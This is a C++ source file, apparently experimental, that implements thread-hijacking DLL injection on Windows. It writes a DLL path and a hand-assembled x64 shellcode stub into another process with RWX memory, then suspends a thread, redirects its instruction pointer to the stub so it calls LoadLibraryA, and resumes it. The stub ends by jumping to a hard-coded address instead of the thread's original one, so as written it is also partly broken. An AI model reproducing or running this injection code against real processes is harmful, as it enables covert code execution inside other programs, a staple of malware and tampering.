#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "log.hpp"
#include "ntdll.h"
#include <ntstatus.h>
#pragma comment(lib, "ntdll_x64.lib")


typedef NTSYSCALLAPI
NTSTATUS
NTAPI
TNtQueryInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _Out_writes_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength
);

typedef bool (*t_LoadLibraryA)(char*);

bool ThreadHijack_LLAInjection(HANDLE hProcess, PROCESSENTRY32W* process_entry, char dll_path[]) {
    debug("Starting HijackThread Injection ...\n");


    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, process_entry->th32ProcessID);

    THREADENTRY32 eThread = { sizeof(THREADENTRY32) };
    eThread.dwSize = sizeof(THREADENTRY32);


    if (!Thread32First(hSnapshot, &eThread)) {
        error("Could not get first thread\n");
        return FALSE;
    }
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

    if (!hNtdll) {
        error("Could not get ntdll.dll module handle\n");
        return FALSE;
    }

    // Either do this or directly call NtQueryInformationThread from included ntdll.lib
    auto _NtQueryInformationThread_a = (TNtQueryInformationThread*)GetProcAddress(hNtdll, "NtQueryInformationThread");



    if (!_NtQueryInformationThread_a) {
        error("Could not get NtQueryInformationThread\n");
        return FALSE;
    }

    // Get LoadLibraryA RVA
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");

    if (!hKernel) {
        error("Could not open handel to kernel32.dll");
        return FALSE;
    }

    t_LoadLibraryA* pLoadLibraryA = (t_LoadLibraryA*)GetProcAddress(hKernel, "LoadLibraryA");

    
    // Write DLL path into process
    void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPath) {
        error("Could not allocate memory in remote process\n");
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pDllPath, dll_path, strlen(dll_path), NULL)) {
        error("Failed to write dll path (%s) to allocated memory (0x%p)\n", dll_path, pDllPath);
        return FALSE;
    }

 //   unsigned long long pDllPathLE = _byteswap_uint64((unsigned long long)pDllPath);
 //   unsigned long long ploadLibraryLE = _byteswap_uint64((unsigned long long)pLoadLibraryA);
    unsigned long long pMain = 0x00007FF65D7110A0;

    unsigned char ShellCode[] = {
        0x50, 0x52, 0x51,                 // push rax, push rdx, push rcx
        0x48, 0xB9,                       
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,                      // mov rcx, <8-byte value> (address)
//        (unsigned char)((unsigned long long)pDllPath & 0xFF),        // Least significant byte
//        (unsigned char)(((unsigned long long)pDllPath >> 8) & 0xFF),
//        (unsigned char)(((unsigned long long)pDllPath >> 16) & 0xFF),
//        (unsigned char)(((unsigned long long)pDllPath >> 24) & 0xFF),
//        (unsigned char)(((unsigned long long)pDllPath >> 32) & 0xFF),
//        (unsigned char)(((unsigned long long)pDllPath >> 40) & 0xFF),
//        (unsigned char)(((unsigned long long)pDllPath >> 48) & 0xFF),
//        (unsigned char)(((unsigned long long)pDllPath >> 56) & 0xFF), // Most significant byte
        0x48, 0xB8,                       // mov rax, <8-byte value> (another address or pointer)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,                      // mov rcx, <8-byte value> (address)

//        (unsigned char)((unsigned long long)pLoadLibraryA & 0xFF),    // Least significant byte
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 8) & 0xFF),
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 16) & 0xFF),
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 24) & 0xFF),
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 32) & 0xFF),
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 40) & 0xFF),
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 48) & 0xFF),
//        (unsigned char)(((unsigned long long)pLoadLibraryA >> 56) & 0xFF), // Most significant byte
        0xFF, 0xD0,                       // call rax (indirect call via rax)
        0x59, 0x5A, 0x58,                 // pop rcx, pop rdx, pop rax
        0x48, 0xB8, // mov rax, pMain
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,                      // mov rcx, <8-byte value> (address)
//        (unsigned char)((unsigned long long)pMain & 0xFF),    // Least significant byte
//        (unsigned char)(((unsigned long long)pMain >> 8) & 0xFF),
//        (unsigned char)(((unsigned long long)pMain >> 16) & 0xFF),
//        (unsigned char)(((unsigned long long)pMain >> 24) & 0xFF),
//        (unsigned char)(((unsigned long long)pMain >> 32) & 0xFF),
//        (unsigned char)(((unsigned long long)pMain >> 40) & 0xFF),
//        (unsigned char)(((unsigned long long)pMain >> 48) & 0xFF),
//        (unsigned char)(((unsigned long long)pMain >> 56) & 0xFF), // Most significant byte
        0xFF, 0xE0,                       // Jump pMain
        0x00                              // Null terminator
    };

    // Populate shellcode with correct values
    // memcpy is taking care of BE -> LE conversion
    memcpy_s(&ShellCode[5], 8, &pDllPath, 8);
    memcpy_s(&ShellCode[15], 8, &pLoadLibraryA, 8);
    memcpy_s(&ShellCode[30], 8, &pMain, 8);
    

    size_t shellcode_size = 41;


    void* pShellCode = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    debug("Allocated shellcode memory at 0x%x\n", pShellCode);

    if (!pShellCode) {
        error("Could not allocate shellcode memory in remote process\n");
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pShellCode, ShellCode, shellcode_size, NULL)) {
        error("Failed to write shellcode (%s) to allocated memory (0x%p)\n", ShellCode, pShellCode);
        return FALSE;
    }

    debug("Wrote shellcode to 0x%p\n", pShellCode);


    // Iterate over all threads (Currently break after first one)
    do {
        if (eThread.th32OwnerProcessID != process_entry->th32ProcessID) continue;
        debug("Opening thread: %d\n", eThread.th32ThreadID);
        CONTEXT cCurrentThread = { sizeof(CONTEXT) };

        // This is extremely important
        cCurrentThread.ContextFlags = CONTEXT_CONTROL;
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, eThread.th32ThreadID);

        if (!hThread) {
            error("Could not open handle to thread\n");
            continue;
        }

        // Suspend thread to update context
        SuspendThread(hThread);


        // Get thread context
        if (!GetThreadContext(hThread, &cCurrentThread)) {
            error("Could not get thread context for thread handle: %d; id: %d\n", hThread, eThread.th32ThreadID);
            continue;
        }

        debug("Successfully got thread context\n");


        THREAD_BASIC_INFORMATION tbi;


        NTSTATUS status = _NtQueryInformationThread_a(hThread, _THREADINFOCLASS::ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);

        if (status < 0) {
            error("Could not query infromation thread\n");
            continue;
        }

        TEB* pTEB = (TEB*)tbi.TebBaseAddress;
        debug("teb address: 0x%p\n", pTEB);

        TEB teb = {};

        if (!ReadProcessMemory(hProcess, pTEB, &teb, sizeof(teb), NULL)) {
            error("Could not read TEB\n");
            continue;
        }

        PEB* pPEB = teb.ProcessEnvironmentBlock;


        PEB peb = { sizeof(PEB) };

        if (!ReadProcessMemory(hProcess, pPEB, &peb, sizeof(peb), NULL)) {
            error("Could not read PEB\n");
            continue;
        }


        cCurrentThread.Rip = (DWORD64)pShellCode;
        debug("Setting Rip to 0x%p\n", cCurrentThread.Rip);

       
        if (!SetThreadContext(hThread, &cCurrentThread)) {
            error("Could not set thread context\n");
            continue;
        }

        debug("Successfully updated thread context\n");
        MessageBoxA(NULL, "Click to resume thread", "Thread Suspended", MB_OK);
        ResumeThread(hThread);

        debug("Resumed thread: %d\n", eThread.th32ThreadID);


        GetThreadContext(hThread, &cCurrentThread);

        debug("Checking registers\n");
        debug("Rax: 0x%x  -  Rip 0x%x\n", cCurrentThread.Rax, cCurrentThread.Rip);

        break; // Break for testing purposes

    } while (Thread32Next(hSnapshot, &eThread));

    return TRUE;
}
